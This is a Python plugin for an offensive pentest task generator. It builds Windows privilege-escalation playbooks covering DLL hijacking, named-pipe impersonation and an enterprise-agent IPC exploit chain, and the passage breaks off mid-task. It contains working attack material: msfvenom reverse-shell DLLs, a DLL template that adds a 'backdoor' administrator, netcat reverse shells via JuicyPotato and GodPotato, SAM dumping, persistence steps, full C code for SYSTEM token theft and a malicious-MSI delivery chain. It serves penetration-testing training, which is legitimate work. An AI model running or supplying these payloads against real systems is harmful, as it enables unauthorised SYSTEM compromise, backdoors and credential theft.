"""
Windows DLL Hijacking and IPC Privilege Escalation Plugin

Generates tasks for Windows privilege escalation via:
- DLL Search Order Hijacking
- Phantom DLL Hijacking
- Writable System PATH exploitation
- Named Pipe Client Impersonation
- IPC Server Exploitation
- Auto-Updater Abuse

Extracted from HackTricks Windows Local Privilege Escalation guides
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class WindowsDllIpcPrivescPlugin(ServicePlugin):
    """Windows DLL Hijacking and IPC privilege escalation plugin"""

    @property
    def name(self) -> str:
        return "windows-dll-ipc-privesc"

    @property
    def default_ports(self) -> List[int]:
        return [445, 139]  # SMB ports (Windows targets)

    @property
    def service_names(self) -> List[str]:
        return ['microsoft-ds', 'netbios-ssn', 'smb', 'windows']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect Windows targets for privilege escalation enumeration"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        ostype = port_info.get('ostype', '').lower()
        port = port_info.get('port')

        # Check for Windows indicators
        if any(indicator in ostype for indicator in ['windows', 'win']):
            return True

        # Check for Windows services
        if any(svc in service for svc in ['microsoft-ds', 'netbios-ssn', 'smb']):
            return True

        # Check for Windows products
        if any(prod in product for prod in ['windows', 'microsoft', 'smb']):
            return True

        # Check for common Windows ports
        if port in [445, 139, 135, 3389]:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Windows DLL/IPC privilege escalation task tree"""
        ostype = service_info.get('ostype', 'Windows')

        tasks = {
            'id': f'windows-dll-ipc-privesc-{port}',
            'name': f'Windows DLL/IPC Privilege Escalation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # === PHASE 1: DLL HIJACKING ENUMERATION ===
        dll_hijack_tasks = {
            'id': f'dll-hijacking-enum-{port}',
            'name': 'DLL Hijacking Enumeration',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: Find Missing DLLs with Procmon
        dll_hijack_tasks['children'].append({
            'id': f'procmon-missing-dlls-{port}',
            'name': 'Find Missing DLLs (Procmon)',
            'type': 'manual',
            'metadata': {
                'description': 'Use Procmon to identify missing DLLs loaded by privileged processes',
                'tags': ['OSCP:HIGH', 'MANUAL', 'WINDOWS', 'PRIVESC'],
                'flag_explanations': {
                    'Filter 1': 'Result is "NAME NOT FOUND" - Shows missing DLL attempts',
                    'Filter 2': 'Path ends with ".dll" - Only show DLL operations',
                    'Show File System Activity': 'Filter to file operations only'
                },
                'success_indicators': [
                    'Missing DLLs found in writable directories',
                    'Privileged process (SYSTEM/High Integrity) loading missing DLL',
                    'DLL searched in PATH directories before system directories'
                ],
                'failure_indicators': [
                    'All DLLs found in system directories',
                    'No write permissions to search directories',
                    'Process runs with same/lower privileges'
                ],
                'next_steps': [
                    'Check write permissions on directories where DLL was searched',
                    'Verify process privilege level (SYSTEM/High Integrity)',
                    'Check DLL search order for hijackable locations',
                    'Generate malicious DLL matching missing exports'
                ],
                'alternatives': [
                    'Manual: strings process.exe | findstr ".dll"',
                    'Manual: dumpbin /imports process.exe',
                    'PowerSploit: Find-ProcessDLLHijack',
                    'PowerSploit: Find-PathDLLHijack'
                ],
                'notes': 'Launch Procmon BEFORE system boot (Enable boot logging) to catch early process DLL loads. Focus on services and scheduled tasks that run as SYSTEM. Common missing DLLs: WptsExtensions.dll (Task Scheduler), Unknown.DLL (DPS), SharedRes.dll',
                'estimated_time': '10-15 minutes'
            }
        })

        # Task 1.2: Check Writable PATH Directories
        dll_hijack_tasks['children'].append({
            'id': f'writable-path-check-{port}',
            'name': 'Check Writable System PATH Directories',
            'type': 'command',
            'metadata': {
                'command': 'cmd.exe /c for %A in ("%path:;=";"%") do ( icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )',
                'description': 'Find directories in System PATH where current user has write permissions',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'WINDOWS'],
                'flag_explanations': {
                    'for %A in ("%path:;=";"%")': 'Loop through each directory in PATH environment variable',
                    'icacls "%~A"': 'Check permissions on each PATH directory',
                    'findstr /i "(F) (M) (W)"': 'Filter for Full/Modify/Write permissions',
                    'findstr /i "... %username%"': 'Check if current user or common groups have permissions',
                    '2>nul': 'Suppress error messages for non-existent paths'
                },
                'success_indicators': [
                    'Directories found with (F) Full Control',
                    'Directories with (M) Modify or (W) Write permissions',
                    'Directories listed for current username or Everyone/Authenticated Users'
                ],
                'failure_indicators': [
                    'No output (no writable directories found)',
                    'Access denied errors',
                    'Only User PATH directories writable (not System PATH)'
                ],
                'next_steps': [
                    'Run Procmon to find missing DLLs in privileged processes',
                    'Check if any missing DLL is searched in writable PATH directory',
                    'Create malicious DLL in writable PATH directory',
                    'Restart service or reboot to trigger DLL load'
                ],
                'alternatives': [
                    'Manual: accesschk.exe -dqv "C:\\Windows\\System32"',
                    'Manual: icacls "C:\\Python27"',
                    'PowerShell: Get-Acl -Path $env:PATH.Split(";") | Where-Object {$_.AccessToString -match "Allow"}',
                    'Winpeas: Will automatically check writable PATH directories'
                ],
                'notes': 'Writable System PATH directories are rare but powerful. User PATH directories do NOT work for DLL hijacking privilege escalation. Common writable directories: C:\\Python27, C:\\Python39, custom application directories added to System PATH by installers',
                'estimated_time': '30 seconds'
            }
        })

        # Task 1.3: Check DLL Search Order
        dll_hijack_tasks['children'].append({
            'id': f'dll-search-order-{port}',
            'name': 'Understand DLL Search Order',
            'type': 'manual',
            'metadata': {
                'description': 'Learn Windows DLL search order for exploitation planning',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EDUCATION'],
                'flag_explanations': {
                    'SafeDllSearchMode': 'Registry key HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode (default enabled)',
                    'LOAD_WITH_ALTERED_SEARCH_PATH': 'LoadLibraryEx flag that changes search order'
                },
                'success_indicators': [
                    'Understand default DLL search order on 32-bit systems',
                    'Know how SafeDllSearchMode affects search order',
                    'Identify exploitable search order positions'
                ],
                'failure_indicators': [
                    'Confusion about KnownDLLs exceptions',
                    'Not understanding absolute path DLL loading'
                ],
                'next_steps': [
                    'Check SafeDllSearchMode registry value',
                    'Identify which search order position is exploitable',
                    'Place malicious DLL in appropriate directory',
                    'Test DLL loading with Process Monitor'
                ],
                'alternatives': [
                    'Read Microsoft documentation on DLL search order',
                    'Check HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs',
                    'Test with simple DLL and Procmon'
                ],
                'notes': '''
DLL Search Order (SafeDllSearchMode enabled - default):
1. Application directory
2. System directory (C:\\Windows\\System32)
3. 16-bit system directory (C:\\Windows\\System)
4. Windows directory (C:\\Windows)
5. Current directory
6. Directories in System PATH environment variable

Exceptions:
- KnownDLLs (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs) bypass search
- Absolute path DLL loads skip search order
- DLL already loaded in memory is reused (no search)

Exploitation: Place malicious DLL in position 1, 5, or 6 before legitimate DLL position
''',
                'estimated_time': '5 minutes (reference)'
            }
        })

        # Task 1.4: Phantom DLL Hijacking
        dll_hijack_tasks['children'].append({
            'id': f'phantom-dll-hijacking-{port}',
            'name': 'Phantom DLL Hijacking (CVE-2025-1729 Lenovo Example)',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit missing DLLs that applications attempt to load but do not exist anywhere on the system',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'WINDOWS', 'PRIVESC'],
                'flag_explanations': {
                    'Phantom DLL': 'DLL that application attempts to load but does not exist (e.g., hostfxr.dll)',
                    'CREATOR OWNER': 'Security principal that allows users to drop files in specific directories'
                },
                'success_indicators': [
                    'Application attempts to load non-existent DLL from writable directory',
                    'Scheduled task or service runs with elevated privileges',
                    'Malicious DLL loaded and executed in elevated context'
                ],
                'failure_indicators': [
                    'DLL exists in system directories',
                    'Application runs with same or lower privileges',
                    'Directory not writable by current user'
                ],
                'next_steps': [
                    'Identify scheduled tasks running as SYSTEM/Administrator',
                    'Check task working directory permissions',
                    'Create stub DLL with DllMain payload',
                    'Wait for scheduled task execution or trigger manually'
                ],
                'alternatives': [
                    'Manual: schtasks /query /fo LIST /v | findstr /i "taskname author working"',
                    'Manual: icacls "C:\\ProgramData\\*" /T | findstr /i "BUILTIN\\Users:(OI)(CI)(M)"',
                    'PowerShell: Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}'
                ],
                'notes': '''
Case Study: CVE-2025-1729 - Lenovo TrackPoint Quick Menu
- Component: TPQMAssistant.exe at C:\\ProgramData\\Lenovo\\TPQM\\Assistant\\
- Scheduled Task: Runs daily at 9:30 AM under logged-on user context
- Missing DLL: hostfxr.dll (searched in working directory first)
- Directory Permissions: Writable by CREATOR OWNER

Exploitation: Drop hostfxr.dll in C:\\ProgramData\\Lenovo\\TPQM\\Assistant\\
When task runs under administrator session → medium integrity execution → chain UAC bypass

Common phantom DLLs: hostfxr.dll, WptsExtensions.dll, Unknown.DLL, SharedRes.dll
''',
                'estimated_time': '20-30 minutes'
            }
        })

        # Task 1.5: DLL Proxifying
        dll_hijack_tasks['children'].append({
            'id': f'dll-proxifying-{port}',
            'name': 'Generate Proxified Malicious DLL',
            'type': 'manual',
            'metadata': {
                'description': 'Create DLL that executes payload while forwarding all function calls to legitimate DLL',
                'tags': ['OSCP:HIGH', 'MANUAL', 'WINDOWS', 'EXPLOIT'],
                'flag_explanations': {
                    'DLLirant': 'Tool to automatically generate proxified DLLs',
                    'Spartacus': 'Alternative tool for DLL proxying',
                    'dumpbin /exports': 'List functions exported by legitimate DLL'
                },
                'success_indicators': [
                    'Proxified DLL generated with all required exports',
                    'Malicious code executes in DllMain',
                    'Application continues to function normally'
                ],
                'failure_indicators': [
                    'Application crashes due to missing exports',
                    'Functions not properly forwarded to legitimate DLL',
                    'Payload fails to execute'
                ],
                'next_steps': [
                    'Test proxified DLL in development environment',
                    'Place proxified DLL in hijackable location',
                    'Restart service or application to load DLL',
                    'Verify payload execution and DLL functionality'
                ],
                'alternatives': [
                    'DLLirant: python DLLirant.py -d legitimate.dll -o proxified.dll',
                    'Spartacus: Spartacus.exe -i legitimate.dll -o proxified.dll',
                    'Manual: dumpbin /exports legitimate.dll > exports.txt',
                    'Manual: Create .def file with all exports and implement forwarding'
                ],
                'notes': '''
DLL Proxifying ensures application stability while executing payload.
Required when application imports specific functions from hijacked DLL.

Generate proxified DLL:
1. dumpbin /exports legitimate.dll (identify required exports)
2. Create DLL with DllMain payload + export forwarding
3. Compile with: x86_64-w64-mingw32-gcc -shared -o proxified.dll main.c -Wl,--out-implib,main.a

Tools:
- DLLirant: https://github.com/redteamsocietegenerale/DLLirant
- Spartacus: https://github.com/Accenture/Spartacus
''',
                'estimated_time': '15-20 minutes'
            }
        })

        # Task 1.6: Create Malicious DLL
        dll_hijack_tasks['children'].append({
            'id': f'create-malicious-dll-{port}',
            'name': 'Create Malicious DLL',
            'type': 'command',
            'metadata': {
                'command': 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o malicious.dll',
                'description': 'Generate malicious DLL with reverse shell payload',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'WINDOWS'],
                'flag_explanations': {
                    '-p windows/x64/shell_reverse_tcp': 'Windows x64 reverse shell payload',
                    'LHOST=<LHOST>': 'Attacker IP address for reverse shell callback',
                    'LPORT=<LPORT>': 'Attacker listening port for reverse shell',
                    '-f dll': 'Output format as Windows DLL',
                    '-o malicious.dll': 'Output filename'
                },
                'success_indicators': [
                    'DLL file created successfully',
                    'No compilation errors',
                    'DLL exports DllMain function'
                ],
                'failure_indicators': [
                    'msfvenom not installed',
                    'Invalid payload specified',
                    'Network connectivity issues'
                ],
                'next_steps': [
                    'Set up netcat listener: nc -nlvp <LPORT>',
                    'Copy DLL to hijackable location on target',
                    'Restart service or trigger DLL load',
                    'Catch reverse shell connection'
                ],
                'alternatives': [
                    'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o msf.dll',
                    'msfvenom -p windows/adduser USER=backdoor PASS=P@ssw0rd123 -f dll -o adduser.dll',
                    'Custom DLL: x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c',
                    'Custom DLL with user creation (see notes for C code)'
                ],
                'notes': '''
Meterpreter payloads may be caught by Windows Defender.
For OSCP exam, reverse shell or custom DLL recommended.

Custom DLL Template (x64):
#include <windows.h>
BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators backdoor /add");
        ExitProcess(0);
    }
    return TRUE;
}

Compile: x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c

WARNING: Ensure DLL architecture matches target process (x86 vs x64)
''',
                'estimated_time': '2-3 minutes'
            }
        })

        tasks['children'].append(dll_hijack_tasks)

        # === PHASE 2: NAMED PIPE CLIENT IMPERSONATION ===
        named_pipe_tasks = {
            'id': f'named-pipe-impersonation-{port}',
            'name': 'Named Pipe Client Impersonation',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: Check SeImpersonatePrivilege
        named_pipe_tasks['children'].append({
            'id': f'check-seimpersonate-{port}',
            'name': 'Check SeImpersonatePrivilege',
            'type': 'command',
            'metadata': {
                'command': 'whoami /priv | findstr SeImpersonate',
                'description': 'Verify if current user has SeImpersonatePrivilege (required for named pipe impersonation)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'WINDOWS'],
                'flag_explanations': {
                    'whoami /priv': 'Display current user privileges',
                    'findstr SeImpersonate': 'Filter for SeImpersonatePrivilege',
                    'Enabled': 'Privilege is active and usable',
                    'Disabled': 'Privilege exists but not active (can be enabled)'
                },
                'success_indicators': [
                    'SeImpersonatePrivilege shown with "Enabled" state',
                    'Privilege present even if disabled (can be enabled programmatically)'
                ],
                'failure_indicators': [
                    'SeImpersonatePrivilege not listed',
                    'Access denied when running whoami'
                ],
                'next_steps': [
                    'If enabled: Use Potato suite (PrintSpoofer, RoguePotato, JuicyPotato)',
                    'If disabled: Attempt to enable programmatically',
                    'Check for alternate IPC exploitation paths',
                    'Try named pipe client impersonation techniques'
                ],
                'alternatives': [
                    'Manual: whoami /all',
                    'PowerShell: [Security.Principal.WindowsIdentity]::GetCurrent().Groups',
                    'accesschk.exe -w user -p',
                    'Check token with NtQueryInformationToken in C code'
                ],
                'notes': '''
SeImpersonatePrivilege is commonly held by:
- IIS application pool accounts (IIS APPPOOL\\DefaultAppPool)
- SQL Server service accounts (MSSQL$INSTANCE)
- Local Service and Network Service accounts
- Service accounts created by installers

If present → SYSTEM via Potato exploits
Potato Suite: PrintSpoofer, RoguePotato, JuicyPotato[NG], GodPotato
''',
                'estimated_time': '10 seconds'
            }
        })

        # Task 2.2: PrintSpoofer Exploitation
        named_pipe_tasks['children'].append({
            'id': f'printspoofer-exploit-{port}',
            'name': 'PrintSpoofer (Named Pipe via Print Spooler)',
            'type': 'command',
            'metadata': {
                'command': 'PrintSpoofer.exe -i -c cmd',
                'description': 'Escalate from SeImpersonatePrivilege to SYSTEM using Print Spooler named pipe impersonation',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'WINDOWS', 'PRIVESC'],
                'flag_explanations': {
                    '-i': 'Interactive mode - spawn interactive command prompt',
                    '-c cmd': 'Command to execute as SYSTEM (can be changed to powershell, nc.exe, etc.)',
                    'PrintSpoofer.exe': 'Exploit tool that coerces SYSTEM to connect to attacker-controlled named pipe'
                },
                'success_indicators': [
                    'New command prompt spawned with "NT AUTHORITY\\SYSTEM" context',
                    'whoami returns "nt authority\\system"',
                    'Able to access SYSTEM-only resources'
                ],
                'failure_indicators': [
                    'ERROR_CANNOT_IMPERSONATE (1368) - Need to read from pipe first',
                    'ERROR_PRIVILEGE_NOT_HELD (1314) - SeImpersonatePrivilege missing',
                    'Print Spooler service not running',
                    'Access denied'
                ],
                'next_steps': [
                    'Verify SYSTEM access: whoami',
                    'Dump SAM database: reg save HKLM\\SAM sam.hive',
                    'Read SYSTEM files: type C:\\Windows\\System32\\config\\SAM',
                    'Create new admin user: net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
                    'Establish persistent access'
                ],
                'alternatives': [
                    'RoguePotato: RoguePotato.exe -r <LHOST> -e "cmd.exe" -l 9999',
                    'JuicyPotatoNG: JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe"',
                    'GodPotato: GodPotato.exe -cmd "cmd /c whoami"',
                    'Manual named pipe impersonation (see C code in notes)'
                ],
                'notes': '''
PrintSpoofer exploits Windows Print Spooler to coerce SYSTEM connection to attacker pipe.

Requirements:
- SeImpersonatePrivilege enabled
- Print Spooler service running (default on Windows)

Download: https://github.com/itm4n/PrintSpoofer
Alternative: https://github.com/antonioCoco/RoguePotato

Manual named pipe impersonation workflow:
1. CreateNamedPipe(\\\\.\\pipe\\evil)
2. ConnectNamedPipe() - wait for SYSTEM client
3. ReadFile() - must read at least one message
4. ImpersonateNamedPipeClient() - adopt SYSTEM token
5. OpenThreadToken + DuplicateTokenEx(TokenPrimary)
6. CreateProcessWithTokenW() - spawn SYSTEM process

Trigger mechanisms: Print Spooler RPC, DCOM, EFSRPC
''',
                'estimated_time': '1-2 minutes'
            }
        })

        # Task 2.3: JuicyPotato Exploitation
        named_pipe_tasks['children'].append({
            'id': f'juicypotato-exploit-{port}',
            'name': 'JuicyPotato (DCOM Named Pipe Impersonation)',
            'type': 'command',
            'metadata': {
                'command': 'JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c nc.exe <LHOST> <LPORT> -e cmd.exe" -t *',
                'description': 'Escalate privileges using DCOM activation to trigger SYSTEM named pipe connection',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'WINDOWS', 'PRIVESC'],
                'flag_explanations': {
                    '-l 1337': 'Local COM server listening port',
                    '-p c:\\windows\\system32\\cmd.exe': 'Program to execute as SYSTEM',
                    '-a "/c nc.exe ..."': 'Arguments to pass to program (reverse shell)',
                    '-t *': 'Try both CreateProcessWithTokenW and CreateProcessAsUser',
                    '-c {CLSID}': 'Specific DCOM CLSID to abuse (optional, auto-selects if omitted)'
                },
                'success_indicators': [
                    'Reverse shell connection received as NT AUTHORITY\\SYSTEM',
                    'Testing {CLSID} ... OK',
                    'CreateProcessWithTokenW OK or CreateProcessAsUser OK'
                ],
                'failure_indicators': [
                    'Testing {CLSID} ... NG - DCOM object not available',
                    'CreateProcessWithTokenW failed and CreateProcessAsUser failed',
                    'SeImpersonatePrivilege not held',
                    'Windows 10 1809+ (JuicyPotato does not work, use JuicyPotatoNG)'
                ],
                'next_steps': [
                    'If failed on Windows 10 1809+: Use JuicyPotatoNG or RoguePotato',
                    'Try different CLSID from list (see CLSID database in notes)',
                    'Establish persistence with scheduled task or service',
                    'Dump credentials: mimikatz, secretsdump.py'
                ],
                'alternatives': [
                    'JuicyPotatoNG: JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"',
                    'RoguePotato: RoguePotato.exe -r <LHOST> -e "cmd.exe" -l 9999',
                    'GodPotato: GodPotato.exe -cmd "nc.exe <LHOST> <LPORT> -e cmd.exe"',
                    'Manual: See PrintSpoofer or custom named pipe impersonation'
                ],
                'notes': '''
JuicyPotato abuses DCOM to coerce SYSTEM to connect to attacker-controlled named pipe.

Compatibility:
- Windows 7, 8, 10 (up to 1803) - Use JuicyPotato
- Windows 10 1809+ and Windows 11 - Use JuicyPotatoNG
- Windows Server 2019+ - Use PrintSpoofer or RoguePotato

CLSID Database: https://github.com/ohpe/juicy-potato/tree/master/CLSID
Test CLSIDs with: JuicyPotato.exe -l 1337 -c {CLSID} -p cmd.exe -a "/c whoami" -t *

Download:
- JuicyPotato: https://github.com/ohpe/juicy-potato
- JuicyPotatoNG: https://github.com/antonioCoco/JuicyPotatoNG

Common CLSIDs:
Windows 10 Enterprise: {5B3E6773-3A99-4A3D-8096-7765DD11785C}
Windows Server 2016: {752073A1-23F2-4396-85F0-8FDB879ED0ED}
''',
                'estimated_time': '2-5 minutes'
            }
        })

        # Task 2.4: Manual Named Pipe Impersonation
        named_pipe_tasks['children'].append({
            'id': f'manual-pipe-impersonation-{port}',
            'name': 'Manual Named Pipe Client Impersonation',
            'type': 'manual',
            'metadata': {
                'description': 'Manually create named pipe server and impersonate SYSTEM client (high integrity to SYSTEM)',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'WINDOWS', 'PRIVESC', 'ADVANCED'],
                'flag_explanations': {
                    'CreateNamedPipe': 'Create server-side named pipe',
                    'ConnectNamedPipe': 'Wait for client connection',
                    'ImpersonateNamedPipeClient': 'Adopt security context of connecting client',
                    'OpenThreadToken': 'Get impersonation token from current thread',
                    'DuplicateTokenEx(TokenPrimary)': 'Convert impersonation token to primary token',
                    'CreateProcessWithTokenW': 'Spawn process using duplicated token'
                },
                'success_indicators': [
                    'Named pipe created successfully',
                    'SYSTEM client connected to pipe',
                    'ImpersonateNamedPipeClient succeeded',
                    'Process spawned as NT AUTHORITY\\SYSTEM'
                ],
                'failure_indicators': [
                    'ERROR_CANNOT_IMPERSONATE (1368)',
                    'No client connects to pipe',
                    'CreateProcessWithTokenW fails',
                    'Token duplication fails'
                ],
                'next_steps': [
                    'Create named pipe: \\\\.\\pipe\\<random>',
                    'Coerce SYSTEM to connect (Print Spooler, DCOM, EFSRPC)',
                    'Read from pipe before impersonation',
                    'Call ImpersonateNamedPipeClient',
                    'Duplicate token and spawn SYSTEM process'
                ],
                'alternatives': [
                    'Use PrintSpoofer instead of manual implementation',
                    'Use RoguePotato for DCOM coercion',
                    'Use GodPotato for combined approach',
                    'See C code in notes for manual implementation'
                ],
                'notes': '''
Manual Named Pipe Impersonation (C Code):

#include <windows.h>
#include <stdio.h>

int main(void) {
    // 1. Create named pipe
    HANDLE hPipe = CreateNamedPipeA(
        "\\\\\\\\.\\\\pipe\\\\evil",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_WAIT,
        1, 0, 0, 0, NULL
    );

    // 2. Wait for SYSTEM client (use trigger: Print Spooler, DCOM, etc.)
    ConnectNamedPipe(hPipe, NULL);

    // 3. CRITICAL: Read at least one message before impersonation
    char buf[4]; DWORD rb;
    ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

    // 4. Impersonate the client (SYSTEM)
    ImpersonateNamedPipeClient(hPipe);

    // 5. Get impersonation token
    HANDLE impTok, priTok;
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok);

    // 6. Duplicate to primary token
    DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenPrimary, &priTok);

    // 7. Spawn SYSTEM process
    STARTUPINFOW si = {.cb = sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
                           L"cmd.exe", NULL, 0, NULL, NULL, &si, &pi);

    RevertToSelf();
    return 0;
}

Compile: cl.exe impersonate.c advapi32.lib kernel32.lib
''',
                'estimated_time': '30-45 minutes (including C code development)'
            }
        })

        tasks['children'].append(named_pipe_tasks)

        # === PHASE 3: IPC SERVER EXPLOITATION ===
        ipc_exploit_tasks = {
            'id': f'ipc-server-exploit-{port}',
            'name': 'IPC Server Exploitation (Auto-Updaters)',
            'type': 'parent',
            'children': []
        }

        # Task 3.1: Identify IPC Services
        ipc_exploit_tasks['children'].append({
            'id': f'identify-ipc-services-{port}',
            'name': 'Identify Privileged IPC Services',
            'type': 'command',
            'metadata': {
                'command': 'netstat -ano | findstr LISTENING | findstr "127.0.0.1"',
                'description': 'Find localhost-only listening ports that may expose privileged IPC interfaces',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'WINDOWS', 'QUICK_WIN'],
                'flag_explanations': {
                    'netstat -ano': 'Display all network connections with process IDs',
                    'findstr LISTENING': 'Filter for listening ports',
                    'findstr "127.0.0.1"': 'Show only localhost-bound services (IPC candidates)'
                },
                'success_indicators': [
                    'Localhost listening ports found (127.0.0.1:PORT)',
                    'Process IDs mapped to privileged services',
                    'Non-standard ports identified'
                ],
                'failure_indicators': [
                    'No localhost listeners found',
                    'All ports belong to known Windows services',
                    'Unable to identify process owner'
                ],
                'next_steps': [
                    'Map PID to process: tasklist | findstr <PID>',
                    'Check process privileges: wmic process where processid=<PID> get name,commandline,processid',
                    'Test connection: curl http://127.0.0.1:<PORT>',
                    'Enumerate IPC methods: named pipes, TCP sockets, RPC',
                    'Look for enterprise endpoint agents (antivirus, DLP, VPN clients)'
                ],
                'alternatives': [
                    'PowerShell: Get-NetTCPConnection | Where-Object {$_.LocalAddress -eq "127.0.0.1" -and $_.State -eq "Listen"}',
                    'Manual: netstat -ano | findstr ":8080 " (check specific ports)',
                    'SysInternals: TCPView.exe (GUI tool)',
                    'Named pipes: pipelist.exe (SysInternals)'
                ],
                'notes': '''
Target candidates for IPC exploitation:
- Enterprise endpoint agents (Netskope, CrowdStrike, Carbon Black)
- Auto-updater services (Adobe, Java, Zoom)
- Antivirus/EDR management interfaces
- VPN client control interfaces
- Backup agent management ports

Common IPC methods:
1. Named Pipes: \\\\.\\pipe\\*
2. Localhost TCP: 127.0.0.1:PORT
3. Localhost HTTP/HTTPS: http://127.0.0.1:PORT
4. RPC/COM interfaces

Example vulnerable services:
- Netskope stAgentSvc (CVE-2025-0309) - localhost JSON IPC
- Zoom auto-updater - localhost HTTP
- Adobe updater - localhost TCP
''',
                'estimated_time': '2-3 minutes'
            }
        })

        # Task 3.2: Netskope-style IPC Exploitation
        ipc_exploit_tasks['children'].append({
            'id': f'netskope-style-exploit-{port}',
            'name': 'Netskope-style IPC Enrollment Hijacking (CVE-2025-0309)',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit enterprise agent IPC to force re-enrollment to attacker server and deliver malicious update',
                'tags': ['OSCP:LOW', 'MANUAL', 'WINDOWS', 'PRIVESC', 'ADVANCED'],
                'flag_explanations': {
                    'IDP_USER_PROVISIONING_WITH_TOKEN': 'Netskope IPC command ID 148 for enrollment',
                    'JWT alg=None': 'Unsecured JWT with no signature verification',
                    'AddonUrl': 'JWT claim controlling backend server hostname',
                    'check_msi_digest': 'Config flag to disable MSI signature validation'
                },
                'success_indicators': [
                    'Agent connects to attacker-controlled server',
                    'Rogue CA certificate installed in Local Machine Trusted Root',
                    'Malicious MSI downloaded and executed as SYSTEM',
                    'Arbitrary code execution as NT AUTHORITY\\SYSTEM'
                ],
                'failure_indicators': [
                    'IPC authentication failed',
                    'Agent verifies server certificate against pinned CA',
                    'MSI signature validation enforced',
                    'IPC commands encrypted with unknown key'
                ],
                'next_steps': [
                    'Identify IPC method (TCP port, named pipe, HTTP)',
                    'Reverse engineer IPC protocol (JSON, binary, encrypted)',
                    'Craft enrollment command with attacker server URL',
                    'Set up rogue update server with malicious MSI',
                    'Deliver MSI and wait for SYSTEM installation'
                ],
                'alternatives': [
                    'Search for similar patterns in other enterprise agents',
                    'Check auto-updater HTTP traffic with Wireshark',
                    'Reverse engineer agent binaries with IDA/Ghidra',
                    'Look for world-readable registry keys with encryption material'
                ],
                'notes': '''
CVE-2025-0309 Netskope Attack Flow:

1. FORCE ENROLLMENT TO ATTACKER SERVER
   - Craft JWT token with alg=None (no signature)
   - Set AddonUrl claim to attacker-controlled hostname
   - Send IPC message ID 148 to stAgentSvc (SYSTEM service)
   - Service enrolls to attacker server

2. HIJACK UPDATE CHANNEL
   - Serve /v2/config/org/clientconfig with:
     * "updateIntervalInMin": 1 (fast updates)
     * "check_msi_digest": false (disable validation)
   - Serve /config/ca/cert with rogue CA (installed to Trusted Root)
   - Serve /v2/checkupdate with malicious MSI metadata

3. BYPASS SIGNATURE CHECKS
   - Issue leaf cert with CN="Netskope, Inc." from rogue CA
   - Sign malicious MSI with leaf cert
   - Include benign CERT_DIGEST MSI property (not enforced)

4. GAIN SYSTEM
   - Service downloads MSI to C:\\ProgramData\\Netskope\\stAgent\\data\\
   - Service executes: msiexec /i malicious.msi /quiet
   - MSI runs as NT AUTHORITY\\SYSTEM

ENCRYPTED IPC BYPASS (R127+):
- Key: HKLM\\SOFTWARE\\NetSkope\\Provisioning\\nsdeviceidnew
- IV: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductID
- Algorithm: AES (mode determined by implementation)
- Access: World-readable registry keys

Tools:
- NachoVPN: Rogue update server (https://github.com/AmberWolfCyber/NachoVPN)
- UpSkope: IPC client with encryption (https://github.com/AmberWolfCyber/UpSkope)
''',
                'estimated_time': '2-4 hours (full exploit chain)'
            }
        })

        # Task 3.3: IPC Caller Allow-list Bypass
        ipc_exploit_tasks['children'].append({
            'id': f'ipc-allowlist-bypass-{port}',
            'name': 'Bypass IPC Caller Allow-list (Process Name Check)',
            'type': 'manual',
            'metadata': {
                'description': 'Bypass IPC authentication that validates caller by image path or process name',
                'tags': ['OSCP:LOW', 'MANUAL', 'WINDOWS', 'ADVANCED'],
                'flag_explanations': {
                    'Allow-listed binary': 'Vendor binary allowed to communicate with IPC service (e.g., stagentui.exe)',
                    'DLL injection': 'Inject malicious DLL into allow-listed process',
                    'CREATE_SUSPENDED': 'CreateProcess flag to start process in suspended state',
                    'OB callbacks': 'Object Manager callbacks that strip process/thread handle rights'
                },
                'success_indicators': [
                    'Successfully injected into allow-listed process',
                    'IPC service accepts commands from hijacked process',
                    'Bypass tamper protection driver restrictions',
                    'Commands executed as SYSTEM'
                ],
                'failure_indicators': [
